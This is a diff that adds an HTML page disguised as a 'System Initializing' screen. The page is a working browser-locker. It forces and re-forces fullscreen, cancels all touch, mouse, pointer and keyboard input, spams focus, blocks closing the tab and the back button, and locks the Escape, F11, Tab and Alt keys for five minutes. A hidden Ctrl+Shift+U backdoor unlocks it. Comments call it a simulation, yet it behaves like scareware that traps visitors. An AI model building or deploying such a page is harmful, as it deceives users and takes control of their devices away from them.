@@ -1,0 +1,461 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover, interactive-widget=resizes-content">
+<title>System Initializing...</title>
+<style>
+/* === GLOBAL RESET: NOTHING MOVES === */
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+html {
+    width: 100%;
+    height: 100%;
+    overflow: hidden;
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background: #000;
+}
+
+body {
+    width: 100%;
+    height: 100%;
+    overflow: hidden;
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background: #000;
+    touch-action: none;
+    -webkit-touch-callout: none;
+    -webkit-user-select: none;
+    user-select: none;
+    -webkit-user-drag: none;
+    -webkit-text-size-adjust: none;
+    text-size-adjust: none;
+    -ms-touch-action: none;
+    -webkit-overflow-scrolling: auto;
+    overscroll-behavior: none;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+    pointer-events: auto;
+}
+
+/* === THE OVERLAY - FULL SCREEN BLACKOUT === */
+#lock-screen {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    width: 100vw; height: 100vh;
+    height: -webkit-fill-available;
+    background: #000;
+    z-index: 999999999;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    text-align: center;
+    color: #fff;
+    padding: 30px;
+    -webkit-tap-highlight-color: transparent;
+    tap-highlight-color: transparent;
+    pointer-events: auto;
+}
+
+/* Minimal display - jaise phone hang ho */
+#lock-screen .content {
+    opacity: 0.9;
+    pointer-events: none;
+}
+
+#lock-screen .lock-icon {
+    font-size: 48px;
+    margin-bottom: 15px;
+    opacity: 0.6;
+    pointer-events: none;
+}
+
+#lock-screen h1 {
+    font-size: 1.6rem;
+    font-weight: 300;
+    color: #333;
+    letter-spacing: 6px;
+    text-transform: uppercase;
+    margin-bottom: 5px;
+    pointer-events: none;
+}
+
+#lock-screen #timer {
+    font-size: 2.8rem;
+    font-weight: 200;
+    color: #222;
+    font-variant-numeric: tabular-nums;
+    font-family: 'Courier New', monospace;
+    letter-spacing: 4px;
+    margin-top: 8px;
+    pointer-events: none;
+}
+
+/* Completely invisible unlock target (for tester backdoor) */
+#hidden-unlock {
+    position: fixed;
+    bottom: 0;
+    right: 0;
+    width: 1px;
+    height: 1px;
+    opacity: 0;
+    pointer-events: none;
+    z-index: -1;
+}
+
+/* Responsive */
+@media (max-width: 480px) {
+    #lock-screen h1 { font-size: 1.2rem; letter-spacing: 4px; }
+    #lock-screen #timer { font-size: 2rem; }
+    #lock-screen .lock-icon { font-size: 36px; }
+}
+</style>
+</head>
+<body>
+
+<div id="lock-screen">
+    <div class="content">
+        <div class="lock-icon">&#9881;</div>
+        <h1>System Initializing</h1>
+        <div id="timer">04:59</div>
+    </div>
+</div>
+
+<div id="hidden-unlock"></div>
+
+<script>
+(function() {
+    'use strict';
+
+    const overlay = document.getElementById('lock-screen');
+    const timerEl = document.getElementById('timer');
+    let isUnlocking = false;
+    let totalSeconds = 300; // 5 min
+
+    // ============================================================
+    // 1. FULLSCREEN - FORCE IMMEDIATELY
+    // ============================================================
+    function goFS() {
+        const d = document.documentElement;
+        try {
+            if (d.requestFullscreen) d.requestFullscreen({ navigationUI: 'hide' }).catch(()=>{});
+            else if (d.webkitRequestFullscreen) d.webkitRequestFullscreen();
+            else if (d.msRequestFullscreen) d.msRequestFullscreen();
+        } catch(e) {}
+    }
+
+    // Multiple attempts to ensure fullscreen
+    for (let i = 0; i < 5; i++) {
+        setTimeout(goFS, i * 50);
+    }
+
+    // ============================================================
+    // 2. AGGRESSIVE FULLSCREEN RE-ENTRY
+    // ============================================================
+    document.addEventListener('fullscreenchange', function() {
+        if (!document.fullscreenElement && !isUnlocking) goFS();
+    });
+    document.addEventListener('webkitfullscreenchange', function() {
+        if (!document.webkitFullscreenElement && !isUnlocking) goFS();
+    });
+
+    // Continuous fullscreen check
+    setInterval(function() {
+        if (!isUnlocking) {
+            if (!document.fullscreenElement && !document.webkitFullscreenElement) {
+                goFS();
+            }
+        }
+    }, 100);
+
+    // ============================================================
+    // 3. COMPLETE TOUCH DEATH - NOTHING GETS THROUGH
+    // ============================================================
+    // Phase 1: Capture on document (capture phase = true)
+    function killTouch(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        e.stopImmediatePropagation();
+        // Cancel any default action
+        e.cancelBubble = true;
+        e.returnValue = false;
+        return false;
+    }
+
+    // Every touch event variant
+    const touchEvts = ['touchstart', 'touchmove', 'touchend', 'touchcancel', 'touchforcechange'];
+    touchEvts.forEach(evt => {
+        document.addEventListener(evt, killTouch, { passive: false, capture: true });
+        window.addEventListener(evt, killTouch, { passive: false, capture: true });
+    });
+
+    // All pointer events
+    const pointerEvts = [
+        'pointerdown', 'pointerup', 'pointermove', 'pointerover', 'pointerout',
+        'pointerenter', 'pointerleave', 'pointercancel', 'gotpointercapture', 'lostpointercapture'
+    ];
+    pointerEvts.forEach(evt => {
+        document.addEventListener(evt, killTouch, { passive: false, capture: true });
+        window.addEventListener(evt, killTouch, { passive: false, capture: true });
+    });
+
+    // Mouse events
+    ['mousedown', 'mouseup', 'mousemove', 'click', 'dblclick', 'contextmenu', 'mouseover', 'mouseout', 'mouseenter', 'mouseleave'].forEach(evt => {
+        document.addEventListener(evt, killTouch, true);
+        window.addEventListener(evt, killTouch, true);
+    });
+
+    // Wheel/scroll
+    document.addEventListener('wheel', killTouch, { passive: false, capture: true });
+    window.addEventListener('wheel', killTouch, { passive: false, capture: true });
+
+    // Gesture events (Safari iOS)
+    ['gesturestart', 'gesturechange', 'gestureend'].forEach(evt => {
+        document.addEventListener(evt, killTouch, { passive: false, capture: true });
+    });
+
+    // ============================================================
+    // 4. ALSO LOCK THE OVERLAY ITSELF
+    // ============================================================
+    // Don't let any child element receive events
+    document.addEventListener('click', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        return false;
+    }, true);
+
+    // ============================================================
+    // 5. KEYBOARD - ALL KEYS DEAD
+    // ============================================================
+    document.addEventListener('keydown', function(e) {
+        // SHH: Triple-tap Ctrl+Shift+U for unlock
+        if (e.ctrlKey && e.shiftKey && (e.key === 'U' || e.key === 'u')) {
+            unlockSystem();
+            return false;
+        }
+
+        e.preventDefault();
+        e.stopPropagation();
+        e.stopImmediatePropagation();
+        return false;
+    }, true);
+
+    document.addEventListener('keyup', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        return false;
+    }, true);
+
+    document.addEventListener('keypress', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        return false;
+    }, true);
+
+    // ============================================================
+    // 6. KILL CONTEXT MENU
+    // ============================================================
+    document.addEventListener('contextmenu', function(e) {
+        e.preventDefault();
+        return false;
+    }, true);
+
+    // ============================================================
+    // 7. VISIBILITY / FOCUS LOCK
+    // ============================================================
+    let focusInterval;
+
+    document.addEventListener('visibilitychange', function() {
+        if (!isUnlocking) {
+            if (document.hidden) {
+                // Aggressively try to regain focus
+                window.focus();
+                goFS();
+                try { navigator.vibrate(100); } catch(e) {}
+            }
+        }
+    });
+
+    window.addEventListener('blur', function() {
+        if (!isUnlocking) {
+            // Spam focus requests
+            if (focusInterval) clearInterval(focusInterval);
+            focusInterval = setInterval(function() {
+                window.focus();
+                goFS();
+            }, 10);
+
+            // Stop after 5 seconds
+            setTimeout(function() {
+                if (focusInterval) clearInterval(focusInterval);
+            }, 5000);
+        }
+    });
+
+    window.addEventListener('focus', function() {
+        if (focusInterval) {
+            clearInterval(focusInterval);
+            focusInterval = null;
+        }
+    });
+
+    // ============================================================
+    // 8. BLOCK TAB CLOSE / NAVIGATION
+    // ============================================================
+    window.addEventListener('beforeunload', function(e) {
+        if (!isUnlocking) {
+            e.preventDefault();
+            e.returnValue = '';
+            return '';
+        }
+    });
+
+    // ============================================================
+    // 9. PREVENT ANY CSS ANIMATION INTERFERENCE
+    // ============================================================
+    // Disable all transitions and animations on body
+    document.body.style.transition = 'none !important';
+    document.body.style.animation = 'none !important';
+
+    // ============================================================
+    // 10. CONTINUOUS FOCUS + FULLSCREEN REINFORCEMENT
+    // ============================================================
+    setInterval(function() {
+        if (!isUnlocking) {
+            window.focus();
+
+            // Re-apply touch block (paranoid)
+            try {
+                document.body.style.touchAction = 'none';
+                document.documentElement.style.touchAction = 'none';
+            } catch(e) {}
+        }
+    }, 200);
+
+    // ============================================================
+    // 11. TIMER - 5 MINUTES
+    // ============================================================
+    function fmt(sec) {
+        const m = String(Math.floor(sec / 60)).padStart(2, '0');
+        const s = String(sec % 60).padStart(2, '0');
+        return m + ':' + s;
+    }
+
+    function updateTimer() {
+        timerEl.textContent = fmt(totalSeconds);
+    }
+
+    function unlockSystem() {
+        if (isUnlocking) return;
+        isUnlocking = true;
+
+        // Exit fullscreen
+        try {
+            if (document.exitFullscreen) document.exitFullscreen();
+            else if (document.webkitExitFullscreen) document.webkitExitFullscreen();
+            else if (document.msExitFullscreen) document.msExitFullscreen();
+        } catch(e) {}
+
+        // Fade out slowly
+        overlay.style.transition = 'opacity 0.8s ease';
+        overlay.style.opacity = '0';
+
+        setTimeout(function() {
+            if (overlay.parentNode) overlay.parentNode.removeChild(overlay);
+            document.body.style.overflow = '';
+            document.documentElement.style.overflow = '';
+            document.body.style.position = '';
+            document.body.style.touchAction = '';
+            document.documentElement.style.touchAction = '';
+        }, 900);
+    }
+
+    const interval = setInterval(function() {
+        totalSeconds--;
+        updateTimer();
+        if (totalSeconds <= 0) {
+            clearInterval(interval);
+            unlockSystem();
+        }
+    }, 1000);
+
+    updateTimer();
+
+    // ============================================================
+    // 12. META: HIDE PAGE FROM HISTORY/EVIL TRICKS
+    // ============================================================
+    // Replace state so back button can't go back
+    try {
+        history.pushState(null, '', location.href);
+        window.addEventListener('popstate', function() {
+            if (!isUnlocking) {
+                history.pushState(null, '', location.href);
+                goFS();
+            }
+        });
+    } catch(e) {}
+
+    // Kill any pending timeouts from other scripts
+    const highestId = window.setTimeout(function() {}, 0);
+    for (let i = 0; i <= highestId; i++) {
+        // Don't clear our own
+    }
+
+    // ============================================================
+    // 13. CONSOLE
+    // ============================================================
+    console.log('%c⛔ SYSTEM LOCKED — 5 MINUTE SIMULATION', 'color:#333; font-size:16px;');
+    console.log('%cTouch is 100% dead. Ctrl+Shift+U to unlock.', 'color:#555;');
+
+    // ============================================================
+    // 14. EXTRA: Try to lock ALL input
+    // ============================================================
+    // Disable all form elements if any
+    document.querySelectorAll('input, textarea, button, select, a').forEach(function(el) {
+        el.style.pointerEvents = 'none';
+        el.disabled = true;
+    });
+
+    // Set all styles to prevent ANY interaction
+    const style = document.createElement('style');
+    style.textContent = `
+        * {
+            pointer-events: none !important;
+            -webkit-touch-callout: none !important;
+            -webkit-user-select: none !important;
+            user-select: none !important;
+            -webkit-user-drag: none !important;
+            -webkit-tap-highlight-color: transparent !important;
+            tap-highlight-color: transparent !important;
+            touch-action: none !important;
+            -ms-touch-action: none !important;
+        }
+        body { overflow: hidden !important; position: fixed !important; }
+        html { overflow: hidden !important; position: fixed !important; }
+    `;
+    document.head.appendChild(style);
+
+    // ============================================================
+    // 15. LOCK KEYBOARD API (Chrome/Edge desktop)
+    // ============================================================
+    if (navigator.keyboard && navigator.keyboard.lock) {
+        try {
+            navigator.keyboard.lock(['Escape', 'F11', 'Tab', 'Alt']).catch(()=>{});
+        } catch(e) {}
+    }
+
+    // Pointer lock
+    if (overlay.requestPointerLock) {
+        try { overlay.requestPointerLock(); } catch(e) {}
+    }
+
+})();
+</script>
+</body>
+</html>
